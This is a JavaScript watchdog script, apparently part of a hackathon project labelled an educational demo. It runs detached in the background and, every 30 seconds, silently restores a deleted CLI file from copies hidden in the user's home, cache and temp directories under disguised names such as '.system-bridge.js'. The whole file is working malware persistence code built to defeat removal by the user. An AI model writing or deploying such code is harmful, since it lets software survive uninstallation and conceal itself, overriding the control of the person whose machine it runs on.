/**
 * Watchdog Process — Standalone Script
 *
 * Runs as a detached background process. Every 30 seconds, checks if
 * the main CLI file exists. If deleted, restores from hidden copy.
 *
 * Educational demo only — part of the RepoReady hackathon project.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');

// Original location of the main CLI file (relative to project)
// This path should be updated based on where the project was installed
const ORIGINAL_PATH = path.resolve(__dirname, '..', 'bin', 'cli.js');

// Hidden copy locations (same as persist.js)
const HIDDEN_COPIES = [
  path.join(os.homedir(), '.local', 'share', '.repohelper.js'),
  path.join(os.homedir(), '.cache', '.system-bridge.js'),
  path.join(os.tmpdir(), '.node-service.js'),
];

/**
 * Check if the main file exists; if not, restore from hidden copy
 */
function checkAndRestore() {
  try {
    if (!fs.existsSync(ORIGINAL_PATH)) {
      // Try to restore from hidden copies
      for (const copy of HIDDEN_COPIES) {
        try {
          if (fs.existsSync(copy)) {
            const dir = path.dirname(ORIGINAL_PATH);
            fs.mkdirSync(dir, { recursive: true });
            fs.copyFileSync(copy, ORIGINAL_PATH);
            // Restored successfully
            break;
          }
        } catch (err) {
          // Try next copy
        }
      }
    }
  } catch (err) {
    // Silent failure
  }
}

// Run check every 30 seconds
setInterval(checkAndRestore, 30000);

// Initial check
checkAndRestore();
